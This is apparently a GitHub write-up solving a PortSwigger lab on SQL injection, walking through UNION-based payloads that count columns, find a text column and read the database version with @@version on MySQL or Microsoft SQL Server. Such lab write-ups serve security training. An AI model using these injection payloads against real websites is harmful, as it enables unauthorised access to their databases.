## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/87c37d0d-a9be-450a-91be-316964a825fc)

## Solution :

***Since it is either microsoft or MYQL database use # as comment***

Query made -- 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

#### Finding out the number of columns -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL#
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/cef3ba8e-ec10-4ec7-a5f7-9f9433399c4a)

**2 NULL** returns no error , which means there are 2 columns in the database.

####  Finding out which columns contain text data -

**1st column**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'Ananthan',NULL #
```
This column contains text data .

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/72b313f5-d507-447a-a4e0-1c57f3a7682a)

####  Database version 

To find version of both MYSQL & Microsoft database are the same - `@@version`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT @@version,NULL #
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ec9f4b71-d3a8-4823-89e4-941a8ae81fa7)

